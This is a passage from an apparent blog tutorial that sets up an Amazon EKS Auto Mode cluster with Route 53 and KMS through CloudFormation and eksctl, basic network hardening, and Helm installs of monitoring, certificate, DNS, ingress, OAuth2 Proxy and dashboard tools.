--hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Utilize your domain registrar to update the nameservers for your zone (e.g., mylabs.dev) to point to Amazon Route 53 nameservers. Here‚Äôs how to discover the required Route 53 nameservers: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Establish the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This operation‚Äôs specifics may vary based on your domain registrar; I use Cloudflare and employ Ansible for automation: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create the service-linked role Creating the service-linked role for Spot Instances is a one-time operation. Create the AWSServiceRoleForEC2Spot role to use Spot Instances in the Amazon EKS cluster: aws iam create-service-linked-role --aws-service-name spot.amazonaws.com Details: Work with Spot Instances Create Route53 zone and KMS key infrastructure Generate a CloudFormation template that defines an Amazon Route 53 zone and an AWS Key Management Service (KMS) key. Add the new domain CLUSTER_FQDN to Route 53, and set up DNS delegation from the BASE_DOMAIN. tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live - Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN (domain for all applications) - Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name - Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Allow direct access to key metadata to the account Effect: Allow Principal: AWS: - !Sub \"arn:${AWS::Partition}:iam::${AWS::AccountId}:root\" Action: - kms:* Resource: \"*\" - Sid: Allow access through EBS for all principals in the account that are authorized to use EBS Effect: Allow Principal: AWS: \"*\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:CreateGrant - kms:DescribeKey Resource: \"*\" Condition: StringEquals: kms:ViaService: !Sub \"ec2.${AWS::Region}.amazonaws.com\" kms:CallerAccount: !Sub \"${AWS::AccountId}\" Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" EOF # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" --tags \"${TAGS//,/ }\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms\" --query \"Stacks[0].Outputs[? OutputKey==\\`KMSKeyArn\\` || OutputKey==\\`KMSKeyId\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Amazon EKS Auto Mode I will use eksctl to create the Amazon EKS Auto Mode cluster. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_REGION} tags: $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_REGION}a - ${AWS_REGION}b accessConfig: accessEntries: - principalARN: arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:role/admin accessPolicies: - policyARN: arn:${AWS_PARTITION}:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy accessScope: type: cluster iam: podIdentityAssociations: - namespace: cert-manager serviceAccountName: cert-manager roleName: eksctl-${CLUSTER_NAME}-pia-cert-manager wellKnownPolicies: certManager: true - namespace: external-dns serviceAccountName: external-dns roleName: eksctl-${CLUSTER_NAME}-pia-external-dns wellKnownPolicies: externalDNS: true addons: - name: eks-pod-identity-agent autoModeConfig: enabled: true nodePools: [\"system\"] secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" || eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" Enhance the security posture of the EKS cluster by addressing the following concerns: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) AWS_NACL_ID=$(aws ec2 describe-network-acls --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" --query 'NetworkAcls[*].NetworkAclId' --output text) The default security group should have no rules configured: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true The VPC NACL allows unrestricted SSH access, and the VPC NACL allows unrestricted RDP access: aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 1 --protocol tcp --port-range \"From=22,To=22\" --cidr-block 0.0.0.0/0 --rule-action Deny aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 2 --protocol tcp --port-range \"From=3389,To=3389\" --cidr-block 0.0.0.0/0 --rule-action Deny The VPC should have Route 53 DNS resolver with logging enabled: AWS_CLUSTER_LOG_GROUP_ARN=$(aws logs describe-log-groups --query \"logGroups[?logGroupName=='/aws/eks/${CLUSTER_NAME}/cluster'].arn\" --output text) AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID=$(aws route53resolver create-resolver-query-log-config \\ --name \"${CLUSTER_NAME}-vpc-dns-logs\" \\ --destination-arn \"${AWS_CLUSTER_LOG_GROUP_ARN}\" \\ --creator-request-id \"$(uuidgen)\" --query 'ResolverQueryLogConfig.Id' --output text) aws route53resolver associate-resolver-query-log-config \\ --resolver-query-log-config-id \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID}\" \\ --resource-id \"${AWS_VPC_ID}\" I was not able to get NetworkPolicy working correctly with kube-prometheus-stack in EKS Auto Mode. Prometheus was encountering a dial tcp 10.100.0.1:443: i/o timeout error and could not retrieve metric data. Therefore, I will keep NetworkPolicy turned off for this setup. Create a Node Class for Amazon EKS. This defines infrastructure-level settings that apply to groups of nodes in your EKS cluster, including network configuration, storage settings, and resource tagging: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-eks-nodeclass.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: eks.amazonaws.com/v1 kind: NodeClass metadata: name: my-default spec: $(kubectl get nodeclasses default -o yaml | yq '.spec | pick([\"role\", \"securityGroupSelectorTerms\", \"subnetSelectorTerms\"])' | sed 's/\\(.*\\)/ \\1/') ephemeralStorage: size: 20Gi # https://github.com/eksctl-io/eksctl/issues/8136 # tags: # Name: ${CLUSTER_NAME} EOF Create a Node Pool for EKS Auto Mode. This defines specific requirements for your compute resources, including instance types, availability zones, architectures, and capacity types: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: my-default spec: template: spec: nodeClassRef: group: eks.amazonaws.com kind: NodeClass name: my-default requirements: - key: eks.amazonaws.com/instance-category operator: In values: [\"t\"] - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: topology.kubernetes.io/zone operator: In values: [\"${AWS_REGION}a\"] - key: kubernetes.io/arch operator: In values: [\"arm64\"] - key: kubernetes.io/os operator: In values: [\"linux\"] limits: cpu: 8 memory: 32Gi EOF Create a new StorageClass based on the EBS CSI driver: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-storage-storageclass.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: annotations: storageclass.kubernetes.io/is-default-class: \"true\" name: gp3 provisioner: ebs.csi.eks.amazonaws.com # https://github.com/kubernetes-sigs/aws-ebs-csi-driver/blob/master/docs/parameters.md parameters: kmsKeyId: ${AWS_KMS_KEY_ID} reclaimPolicy: Delete volumeBindingMode: WaitForFirstConsumer allowVolumeExpansion: true EOF Mailpit Mailpit will be used to receive email alerts from Prometheus. Install the mailpit Helm chart and modify its default values: # renovate: datasource=helm depName=mailpit registryUrl=https://jouve.github.io/charts/ MAILPIT_HELM_CHART_VERSION=\"0.21.0\" helm repo add --force-update jouve https://jouve.github.io/charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" &lt;&lt; EOF ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: An email and SMTP testing tool with API for developers gethomepage.dev/group: Apps gethomepage.dev/icon: https://raw.githubusercontent.com/axllent/mailpit/61241f11ac94eb33bd84e399129992250eff56ce/server/ui/favicon.svg gethomepage.dev/name: Mailpit nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hostname: mailpit.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILPIT_HELM_CHART_VERSION}\" --namespace mailpit --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" mailpit jouve/mailpit Screenshot: kube-prometheus-stack Prometheus should be one of the initial applications installed on the Kubernetes cluster because numerous Kubernetes services and applications can export metrics to it. The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It‚Äôs combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"67.9.0\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false # https://github.com/prometheus-community/helm-charts/blob/main/charts/alertmanager/values.yaml alertmanager: config: global: smtp_smarthost: \"mailpit-smtp.mailpit.svc.cluster.local:25\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email routes: - receiver: email matchers: - severity =~ \"warning|critical\" receivers: - name: email email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: Alert Routing System gethomepage.dev/group: Observability gethomepage.dev/icon: alertmanager.svg gethomepage.dev/name: Alert Manager gethomepage.dev/app: alertmanager gethomepage.dev/pod-selector: \"app.kubernetes.io/name=alertmanager\" nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/description: Visualization Platform gethomepage.dev/enabled: \"true\" gethomepage.dev/group: Observability gethomepage.dev/icon: grafana.svg gethomepage.dev/name: Grafana gethomepage.dev/app: grafana gethomepage.dev/pod-selector: \"app.kubernetes.io/name=grafana\" nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} sidecar: datasources: url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090 dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: # keep-sorted start numeric=yes 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 37 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus # https://github.com/DevOps-Nirvana/Grafana-Dashboards 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 42 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 41 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 34 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 18 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 6 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus 20340-cert-manager: # renovate: depName=\"cert-manager\" gnetId: 20340 revision: 1 datasource: Prometheus 20842-cert-manager-kubernetes: # renovate: depName=\"Cert-manager-Kubernetes\" gnetId: 20842 revision: 1 datasource: Prometheus # keep-sorted end grafana.ini: analytics: check_for_updates: false auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: mailpit-smtp.mailpit.svc.cluster.local:25 from_address: grafana@${CLUSTER_FQDN} # EKS this is not available https://github.com/aws/containers-roadmap/issues/1298 kubeControllerManager: enabled: false kubeEtcd: enabled: false # EKS this is not available https://github.com/aws/containers-roadmap/issues/1298 kubeScheduler: enabled: false # in EKS the kube-proxy metrics are not available https://github.com/aws/containers-roadmap/issues/657 kubeProxy: enabled: false kube-state-metrics: selfMonitor: enabled: true # https://github.com/prometheus-community/helm-charts/issues/3613 prometheus-node-exporter: prometheus: monitor: attachMetadata: node: true relabelings: - sourceLabels: - __meta_kubernetes_endpoint_node_name targetLabel: node action: replace regex: (.+) replacement: \\${1} prometheus: ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: Monitoring System and TSDB gethomepage.dev/group: Observability gethomepage.dev/icon: prometheus.svg gethomepage.dev/name: Prometheus gethomepage.dev/app: prometheus gethomepage.dev/pod-selector: \"app.kubernetes.io/name=prometheus\" nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false probeSelectorNilUsesHelmValues: false retentionSize: 1GB storageSpec: volumeClaimTemplate: spec: storageClassName: gp3 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. The cert-manager ServiceAccount was created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.16.3\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF crds: enabled: true serviceAccount: name: cert-manager enableCertificateOwnerRef: true prometheus: servicemonitor: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager Add ClusterIssuers for the Let‚Äôs Encrypt staging environment (certificates created using ‚Äústaging‚Äù will not be publicly valid): tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: {} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all kubectl label secret --namespace cert-manager letsencrypt-staging-dns letsencrypt=staging Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF ExternalDNS ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns ServiceAccount was created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.15.1\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF serviceAccount: name: external-dns serviceMonitor: enabled: true interval: 20s policy: sync domainFilters: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns Ingress NGINX Controller ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.12.3\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=15m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: config: annotations-risk-level: Critical use-proxy-protocol: true allowSnippetAnnotations: true ingressClassResource: default: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: # https://www.qovery.com/blog/our-migration-from-kubernetes-built-in-nlb-to-alb-controller/ # https://www.youtube.com/watch?v=xwiRjimKW9c service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} service.beta.kubernetes.io/aws-load-balancer-name: eks-${CLUSTER_NAME} service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: proxy_protocol_v2.enabled=true service.beta.kubernetes.io/aws-load-balancer-type: external loadBalancerClass: eks.amazonaws.com/nlb metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds{host!=\"_\"}) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx OAuth2 Proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"7.9.2\" helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: \"$(openssl rand -base64 32 | head -c 32 | base64)\" configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: A reverse proxy that provides authentication with Google, Azure, OpenID Connect and many more identity providers gethomepage.dev/group: Cluster Management gethomepage.dev/icon: https://raw.githubusercontent.com/oauth2-proxy/oauth2-proxy/899c743afc71e695964165deb11f50b9a0703c97/docs/static/img/logos/OAuth2_Proxy_icon.svg gethomepage.dev/name: OAuth2-Proxy hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy Homepage Install Homepage to provide a nice dashboard. Install the homepage Helm chart and modify its default values: # renovate: datasource=helm depName=homepage registryUrl=http://jameswynn.github.io/helm-charts HOMEPAGE_HELM_CHART_VERSION=\"2.0.1\" helm repo add --force-update jameswynn http://jameswynn.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-homepage.yml\" &lt;&lt; EOF enableRbac: true serviceAccount: create: true ingress: main: enabled: true annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/name: Homepage gethomepage.dev/description: A modern, secure, highly customizable application dashboard gethomepage.dev/group: Apps gethomepage.dev/icon: homepage.png nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: \"nginx\" hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} config: bookmarks: services: widgets: - logo: icon: kubernetes.svg - kubernetes: 